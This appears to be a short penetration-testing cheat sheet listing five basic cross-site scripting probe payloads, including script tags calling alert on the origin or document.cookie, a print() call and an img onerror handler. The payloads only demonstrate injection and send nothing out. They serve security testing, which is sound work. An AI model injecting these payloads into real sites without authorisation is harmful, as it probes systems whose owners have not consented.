
Basic payload
```html
<script>alert(window.origin)</script>
```

Basic payload to display cookie
```html
<script>alert(document.cookie)</script>
```

Payload in case alert() is blocked. Stops rendering HTML and turns it into plaintext.
```html
<script><plaintext></script>
```

Payload to pop up browser print dialog (unlikely to be browser-blocked)
```html
<script>print()</script>
```

Payload that does not contain \<script> tag (useful for DOM attacks). Creates new HTML image object with an onerror that triggers when the image cannot be found:
```html
<img src="" onerror=alert(window.origin)>
```